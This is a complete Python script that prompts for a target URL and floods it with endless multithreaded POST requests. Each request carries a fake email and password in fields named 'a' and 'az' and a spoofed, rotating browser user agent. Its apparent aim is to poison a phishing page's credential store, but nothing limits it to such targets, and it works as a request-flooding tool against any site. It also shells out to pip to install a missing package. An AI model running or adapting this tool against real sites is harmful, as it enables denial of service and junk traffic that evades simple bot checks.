import random
import string
import requests
import threading
from typing import List
try:
    from faker import Faker
except:
    import subprocess
    subprocess.run('pip install Faker', shell=True)
    from faker import Faker
from permutate import add_suffixes, generate_permutations


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.57 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.35.103 Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36",
    "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+",
    "Mozilla/5.0 (Linux; U; en-us; KFTHWI Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.16 Safari/535.19 Silk-Accelerated=true"
]


alphabet = string.ascii_letters + string.digits + string.punctuation
domains = ["@gmail.com", '@googlemail.com', "@yahoo.com", "@outlook.com", "@live.com"]
MAX_THREADS = 8 # Multithreading is not real in python, therefore there's barely any gain from more
fake = Faker()


def generate_random_emails() -> List[str]:
    """
    Generates a random email address.
    Fair Warning: This will generate thousands of emails. You can play with the permutator
    if you want it to generate more. I set the maximum dots per email to 2, anything above
    and my PC couldnt keep up.
    :return: a list of generated (unique) emails
    """
    global fake, domains
    first  = fake.first_name()
    last = fake.last_name()
    middle = random.choice(['_', '.', ''])
    numbers = [random.choice([random.randint(1, 99), '']) for _ in range(3)]
    numbers.extend([first, last, middle])
    # Shuffle email string components
    random.shuffle(numbers)
    prefix = ''.join(str(x).lower() for x in numbers)
    # Comment in for debug, take out during exec so that lock doesnt slow down multithreading.
    #print('Generating permutations for', prefix)
    return add_suffixes(generate_permutations(prefix, True), domains, '')


def generate_random_password(max_len: int = 50) -> str:
    """
    Generate a random password up to the given max len.
    :param max_len: maximum password length, default is 50.
    :return: the generated password.
    """
    global alphabet
    pw_len = random.randint(8, max_len)
    return ''.join(random.choice(alphabet) for i in range(pw_len))


def send_posts(url, location):
    global USER_AGENTS
    while True:
        emails = generate_random_emails()
        for email in emails:
            password = generate_random_password()
            data = {
                "a": email,
                "az": password
            }
            user_agent = random.choice(USER_AGENTS)
            headers = {
                'User-Agent': user_agent
            }
            response = requests.post(url, headers=headers, data=data)
            # Same as above, dont comment in during execution. Console logs require locking, slowing down multithreading.
            #print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")


def main():
    global MAX_THREADS
    URL = input("Enter the URL of the target you want to flood: ")
    threads = []
    locations = ["en_US", "en_GB", "it_IT", "en_IE"]

    for i in range(MAX_THREADS):
        location = random.choice(locations)
        t = threading.Thread(target=send_posts, args=(URL, location))
        t.daemon = True
        threads.append(t)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()